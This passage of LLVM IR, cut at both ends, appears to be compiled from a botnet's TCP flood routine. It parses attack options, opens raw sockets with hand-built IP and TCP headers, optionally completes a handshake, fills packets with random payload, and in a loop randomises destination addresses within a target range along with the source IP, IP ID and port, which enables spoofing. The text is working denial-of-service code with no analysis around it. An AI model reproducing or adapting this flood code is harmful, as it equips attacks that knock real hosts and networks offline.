  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 1)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 0)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
  %127 = getelementptr inbounds %struct.arguments, %struct.arguments* %126, i32 0, i32 2
  %128 = load i8, i8* %127, align 8
  %129 = call zeroext i16 @retrieve_opt_num(%struct.option* %125, i8 zeroext %128, i8 zeroext 17, i16 zeroext -1)
  %130 = zext i16 %129 to i32
  store i32 %130, i32* %18, align 4
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 1
  %133 = load %struct.option*, %struct.option** %132, align 8
  %134 = load %struct.arguments*, %struct.arguments** %2, align 8
  %135 = getelementptr inbounds %struct.arguments, %struct.arguments* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 8
  %137 = load i32, i32* @LOCAL_ADDRESS, align 4
  %138 = call i32 @retrieve_opt_ipv4(%struct.option* %133, i8 zeroext %136, i8 zeroext 18, i32 %137)
  store i32 %138, i32* %19, align 4
  %139 = load %struct.arguments*, %struct.arguments** %2, align 8
  %140 = getelementptr inbounds %struct.arguments, %struct.arguments* %139, i32 0, i32 1
  %141 = load %struct.option*, %struct.option** %140, align 8
  %142 = load %struct.arguments*, %struct.arguments** %2, align 8
  %143 = getelementptr inbounds %struct.arguments, %struct.arguments* %142, i32 0, i32 2
  %144 = load i8, i8* %143, align 8
  %145 = call zeroext i16 @retrieve_opt_num(%struct.option* %141, i8 zeroext %144, i8 zeroext 19, i16 zeroext -1)
  %146 = zext i16 %145 to i32
  store i32 %146, i32* %20, align 4
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 1
  %149 = load %struct.option*, %struct.option** %148, align 8
  %150 = load %struct.arguments*, %struct.arguments** %2, align 8
  %151 = getelementptr inbounds %struct.arguments, %struct.arguments* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 8
  %153 = call i8* @retrieve_opt_str(%struct.option* %149, i8 zeroext %152, i8 zeroext 6, i8* null)
  store i8* %153, i8** %21, align 8
  %154 = load %struct.arguments*, %struct.arguments** %2, align 8
  %155 = getelementptr inbounds %struct.arguments, %struct.arguments* %154, i32 0, i32 1
  %156 = load %struct.option*, %struct.option** %155, align 8
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = call i8* @retrieve_opt_str(%struct.option* %156, i8 zeroext %159, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %161 = ptrtoint i8* %160 to i32
  store i32 %161, i32* %23, align 4
  %162 = load %struct.arguments*, %struct.arguments** %2, align 8
  %163 = getelementptr inbounds %struct.arguments, %struct.arguments* %162, i32 0, i32 3
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = call noalias align 16 i8* @calloc(i64 %165, i64 8) #8
  %167 = bitcast i8* %166 to i8**
  store i8** %167, i8*** %9, align 8
  %168 = load i8**, i8*** %9, align 8
  %169 = icmp ne i8** %168, null
  br i1 %169, label %171, label %170

170:                                              ; preds = %1
  call void @exit(i32 1) #9
  unreachable

171:                                              ; preds = %1
  %172 = load %struct.arguments*, %struct.arguments** %2, align 8
  %173 = getelementptr inbounds %struct.arguments, %struct.arguments* %172, i32 0, i32 3
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i64
  %176 = call noalias align 16 i8* @calloc(i64 %175, i64 4) #8
  %177 = bitcast i8* %176 to i32*
  store i32* %177, i32** %22, align 8
  %178 = load i32*, i32** %22, align 8
  %179 = icmp ne i32* %178, null
  br i1 %179, label %181, label %180

180:                                              ; preds = %171
  call void @exit(i32 1) #9
  unreachable

181:                                              ; preds = %171
  store i32 0, i32* %3, align 4
  br label %182

182:                                              ; preds = %425, %181
  %183 = load i32, i32* %3, align 4
  %184 = load %struct.arguments*, %struct.arguments** %2, align 8
  %185 = getelementptr inbounds %struct.arguments, %struct.arguments* %184, i32 0, i32 3
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %183, %187
  br i1 %188, label %189, label %428

189:                                              ; preds = %182
  %190 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %191 = load i32*, i32** %22, align 8
  %192 = load i32, i32* %3, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i32, i32* %191, i64 %193
  store i32 %190, i32* %194, align 4
  %195 = load i32*, i32** %22, align 8
  %196 = load i32, i32* %3, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds i32, i32* %195, i64 %197
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, -1
  br i1 %200, label %201, label %204

201:                                              ; preds = %189
  %202 = load i8**, i8*** %9, align 8
  %203 = bitcast i8** %202 to i8*
  call void @free(i8* %203) #8
  call void @exit(i32 1) #9
  unreachable

204:                                              ; preds = %189
  store i32 1, i32* %4, align 4
  %205 = load i32*, i32** %22, align 8
  %206 = load i32, i32* %3, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = bitcast i32* %4 to i8*
  %211 = call i32 @setsockopt(i32 %209, i32 0, i32 3, i8* %210, i32 4) #8
  %212 = icmp eq i32 %211, -1
  br i1 %212, label %213, label %216

213:                                              ; preds = %204
  %214 = load i8**, i8*** %9, align 8
  %215 = bitcast i8** %214 to i8*
  call void @free(i8* %215) #8
  call void @exit(i32 1) #9
  unreachable

216:                                              ; preds = %204
  %217 = load i32, i32* %23, align 4
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %219, label %238

219:                                              ; preds = %216
  %220 = load i16, i16* %6, align 2
  %221 = load i32*, i32** %22, align 8
  %222 = load i32, i32* %3, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i32, i32* %221, i64 %223
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.arguments*, %struct.arguments** %2, align 8
  %227 = getelementptr inbounds %struct.arguments, %struct.arguments* %226, i32 0, i32 0
  %228 = load %struct.target*, %struct.target** %227, align 8
  %229 = load i32, i32* %3, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.target, %struct.target* %228, i64 %230
  %232 = getelementptr inbounds %struct.target, %struct.target* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %19, align 4
  %235 = load i16, i16* %8, align 2
  %236 = zext i16 %235 to i32
  %237 = call i32 @tcp_handshake(i16 zeroext %220, i32 %225, i32 %233, i32 %234, i32 %236)
  br label %238

238:                                              ; preds = %219, %216
  %239 = load i16, i16* %5, align 2
  %240 = zext i16 %239 to i32
  %241 = add nsw i32 %240, 110
  %242 = sext i32 %241 to i64
  %243 = call noalias align 16 i8* @malloc(i64 %242) #8
  %244 = load i8**, i8*** %9, align 8
  %245 = load i32, i32* %3, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds i8*, i8** %244, i64 %246
  store i8* %243, i8** %247, align 8
  %248 = load i8**, i8*** %9, align 8
  %249 = load i32, i32* %3, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i8*, i8** %248, i64 %250
  %252 = load i8*, i8** %251, align 8
  %253 = icmp ne i8* %252, null
  br i1 %253, label %257, label %254

254:                                              ; preds = %238
  %255 = load i8**, i8*** %9, align 8
  %256 = bitcast i8** %255 to i8*
  call void @free(i8* %256) #8
  call void @exit(i32 1) #9
  unreachable

257:                                              ; preds = %238
  %258 = load i8**, i8*** %9, align 8
  %259 = load i32, i32* %3, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds i8*, i8** %258, i64 %260
  %262 = load i8*, i8** %261, align 8
  %263 = bitcast i8* %262 to %struct.iphdr*
  store %struct.iphdr* %263, %struct.iphdr** %24, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.tcphdr*
  store %struct.tcphdr* %266, %struct.tcphdr** %25, align 8
  %267 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i64 1
  %269 = bitcast %struct.tcphdr* %268 to i8*
  store i8* %269, i8** %26, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = bitcast %struct.iphdr* %270 to i8*
  %272 = load i8, i8* %271, align 4
  %273 = and i8 %272, 15
  %274 = or i8 %273, 64
  store i8 %274, i8* %271, align 4
  %275 = load i8, i8* %16, align 1
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 1
  store i8 %275, i8* %277, align 1
  %278 = load i16, i16* %5, align 2
  %279 = zext i16 %278 to i64
  %280 = add i64 40, %279
  %281 = trunc i64 %280 to i16
  %282 = call zeroext i16 @htons(i16 zeroext %281) #7
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  store i16 %282, i16* %284, align 2
  %285 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %286 = bitcast %struct.iphdr* %285 to i8*
  %287 = load i8, i8* %286, align 4
  %288 = and i8 %287, -16
  %289 = or i8 %288, 5
  store i8 %289, i8* %286, align 4
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 4
  store i16 0, i16* %291, align 2
  %292 = load i8, i8* %7, align 1
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 5
  store i8 %292, i8* %294, align 4
  %295 = load i16, i16* %17, align 2
  %296 = call zeroext i16 @htons(i16 zeroext %295) #7
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 3
  store i16 %296, i16* %298, align 4
  %299 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 6
  store i8 6, i8* %300, align 1
  %301 = load i32, i32* %19, align 4
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  store i32 %301, i32* %303, align 4
  %304 = load %struct.arguments*, %struct.arguments** %2, align 8
  %305 = getelementptr inbounds %struct.arguments, %struct.arguments* %304, i32 0, i32 0
  %306 = load %struct.target*, %struct.target** %305, align 8
  %307 = load i32, i32* %3, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.target, %struct.target* %306, i64 %308
  %310 = getelementptr inbounds %struct.target, %struct.target* %309, i32 0, i32 0
  %311 = load i32, i32* %310, align 4
  %312 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 9
  store i32 %311, i32* %313, align 4
  %314 = load i16, i16* %6, align 2
  %315 = call zeroext i16 @htons(i16 zeroext %314) #7
  %316 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon* %317 to %struct.anon.0*
  %319 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %318, i32 0, i32 1
  store i16 %315, i16* %319, align 2
  %320 = load i16, i16* %8, align 2
  %321 = call zeroext i16 @htons(i16 zeroext %320) #7
  %322 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %323 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %322, i32 0, i32 0
  %324 = bitcast %union.anon* %323 to %struct.anon.0*
  %325 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %324, i32 0, i32 0
  store i16 %321, i16* %325, align 4
  %326 = load i32, i32* %18, align 4
  %327 = trunc i32 %326 to i16
  %328 = call zeroext i16 @htons(i16 zeroext %327) #7
  %329 = zext i16 %328 to i32
  %330 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %331 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %330, i32 0, i32 0
  %332 = bitcast %union.anon* %331 to %struct.anon.0*
  %333 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %332, i32 0, i32 2
  store i32 %329, i32* %333, align 4
  %334 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %335 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %334, i32 0, i32 0
  %336 = bitcast %union.anon* %335 to %struct.anon.0*
  %337 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %336, i32 0, i32 4
  %338 = load i16, i16* %337, align 4
  %339 = and i16 %338, -241
  %340 = or i16 %339, 80
  store i16 %340, i16* %337, align 4
  %341 = load i8, i8* %10, align 1
  %342 = sext i8 %341 to i16
  %343 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %344 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %343, i32 0, i32 0
  %345 = bitcast %union.anon* %344 to %struct.anon.0*
  %346 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %345, i32 0, i32 4
  %347 = load i16, i16* %346, align 4
  %348 = and i16 %342, 1
  %349 = shl i16 %348, 12
  %350 = and i16 %347, -4097
  %351 = or i16 %350, %349
  store i16 %351, i16* %346, align 4
  %352 = load i8, i8* %11, align 1
  %353 = sext i8 %352 to i16
  %354 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i32 0, i32 0
  %356 = bitcast %union.anon* %355 to %struct.anon.0*
  %357 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = and i16 %353, 1
  %360 = shl i16 %359, 8
  %361 = and i16 %358, -257
  %362 = or i16 %361, %360
  store i16 %362, i16* %357, align 4
  %363 = load i8, i8* %12, align 1
  %364 = sext i8 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  %367 = bitcast %union.anon* %366 to %struct.anon.0*
  %368 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = and i16 %364, 1
  %371 = shl i16 %370, 13
  %372 = and i16 %369, -8193
  %373 = or i16 %372, %371
  store i16 %373, i16* %368, align 4
  %374 = load i8, i8* %13, align 1
  %375 = sext i8 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 0
  %378 = bitcast %union.anon* %377 to %struct.anon.0*
  %379 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %378, i32 0, i32 4
  %380 = load i16, i16* %379, align 4
  %381 = and i16 %375, 1
  %382 = shl i16 %381, 11
  %383 = and i16 %380, -2049
  %384 = or i16 %383, %382
  store i16 %384, i16* %379, align 4
  %385 = load i8, i8* %14, align 1
  %386 = sext i8 %385 to i16
  %387 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 0
  %389 = bitcast %union.anon* %388 to %struct.anon.0*
  %390 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %386, 1
  %393 = shl i16 %392, 10
  %394 = and i16 %391, -1025
  %395 = or i16 %394, %393
  store i16 %395, i16* %390, align 4
  %396 = load i8, i8* %15, align 1
  %397 = sext i8 %396 to i16
  %398 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i32 0, i32 0
  %400 = bitcast %union.anon* %399 to %struct.anon.0*
  %401 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %400, i32 0, i32 4
  %402 = load i16, i16* %401, align 4
  %403 = and i16 %397, 1
  %404 = shl i16 %403, 9
  %405 = and i16 %402, -513
  %406 = or i16 %405, %404
  store i16 %406, i16* %401, align 4
  %407 = call i32 @rand_new()
  %408 = and i32 %407, 65535
  %409 = trunc i32 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon* %411 to %struct.anon.0*
  %413 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %412, i32 0, i32 5
  store i16 %409, i16* %413, align 2
  %414 = load i32, i32* %20, align 4
  %415 = trunc i32 %414 to i16
  %416 = call zeroext i16 @htons(i16 zeroext %415) #7
  %417 = zext i16 %416 to i32
  %418 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon* %419 to %struct.anon.0*
  %421 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %420, i32 0, i32 3
  store i32 %417, i32* %421, align 4
  %422 = load i8*, i8** %26, align 8
  %423 = load i16, i16* %5, align 2
  %424 = zext i16 %423 to i32
  call void @rand_string(i8* %422, i32 %424)
  br label %425

425:                                              ; preds = %257
  %426 = load i32, i32* %3, align 4
  %427 = add nsw i32 %426, 1
  store i32 %427, i32* %3, align 4
  br label %182, !llvm.loop !15

428:                                              ; preds = %182
  br label %429

429:                                              ; preds = %428, %620
  store i32 0, i32* %3, align 4
  br label %430

430:                                              ; preds = %617, %429
  %431 = load i32, i32* %3, align 4
  %432 = load %struct.arguments*, %struct.arguments** %2, align 8
  %433 = getelementptr inbounds %struct.arguments, %struct.arguments* %432, i32 0, i32 3
  %434 = load i8, i8* %433, align 1
  %435 = zext i8 %434 to i32
  %436 = icmp slt i32 %431, %435
  br i1 %436, label %437, label %620

437:                                              ; preds = %430
  %438 = load i8**, i8*** %9, align 8
  %439 = load i32, i32* %3, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds i8*, i8** %438, i64 %440
  %442 = load i8*, i8** %441, align 8
  %443 = bitcast i8* %442 to %struct.iphdr*
  store %struct.iphdr* %443, %struct.iphdr** %27, align 8
  %444 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i64 1
  %446 = bitcast %struct.iphdr* %445 to %struct.tcphdr*
  store %struct.tcphdr* %446, %struct.tcphdr** %28, align 8
  %447 = load %struct.arguments*, %struct.arguments** %2, align 8
  %448 = getelementptr inbounds %struct.arguments, %struct.arguments* %447, i32 0, i32 0
  %449 = load %struct.target*, %struct.target** %448, align 8
  %450 = load i32, i32* %3, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.target, %struct.target* %449, i64 %451
  %453 = getelementptr inbounds %struct.target, %struct.target* %452, i32 0, i32 1
  %454 = load i16, i16* %453, align 4
  %455 = zext i16 %454 to i32
  %456 = icmp slt i32 %455, 32
  br i1 %456, label %457, label %477

457:                                              ; preds = %437
  %458 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 9
  %460 = load i32, i32* %459, align 4
  %461 = call i32 @ntohl(i32 %460) #7
  %462 = call i32 @rand_new()
  %463 = load %struct.arguments*, %struct.arguments** %2, align 8
  %464 = getelementptr inbounds %struct.arguments, %struct.arguments* %463, i32 0, i32 0
  %465 = load %struct.target*, %struct.target** %464, align 8
  %466 = load i32, i32* %3, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.target, %struct.target* %465, i64 %467
  %469 = getelementptr inbounds %struct.target, %struct.target* %468, i32 0, i32 1
  %470 = load i16, i16* %469, align 4
  %471 = zext i16 %470 to i32
  %472 = lshr i32 %462, %471
  %473 = add i32 %461, %472
  %474 = call i32 @htonl(i32 %473) #7
  %475 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 9
  store i32 %474, i32* %476, align 4
  br label %477

477:                                              ; preds = %457, %437
  %478 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 8
  %480 = load i32, i32* %479, align 4
  %481 = icmp eq i32 %480, -1
  br i1 %481, label %482, label %486

482:                                              ; preds = %477
  %483 = call i32 @rand_new()
  %484 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 8
  store i32 %483, i32* %485, align 4
  br label %486

486:                                              ; preds = %482, %477
  %487 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 3
  %489 = load i16, i16* %488, align 4
  %490 = zext i16 %489 to i32
  %491 = icmp eq i32 %490, 65535
  br i1 %491, label %492, label %498

492:                                              ; preds = %486
  %493 = call i32 @rand_new()
  %494 = and i32 %493, 65535
  %495 = trunc i32 %494 to i16
  %496 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 3
  store i16 %495, i16* %497, align 4
  br label %498

498:                                              ; preds = %492, %486
  %499 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  %501 = bitcast %union.anon* %500 to %struct.anon.0*
  %502 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %501, i32 0, i32 1
  %503 = load i16, i16* %502, align 2
  %504 = zext i16 %503 to i32
  %505 = icmp eq i32 %504, 65535
  br i1 %505, label %506, label %514

506:                                              ; preds = %498
  %507 = call i32 @rand_new()
  %508 = and i32 %507, 65535
  %509 = trunc i32 %508 to i16
  %510 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
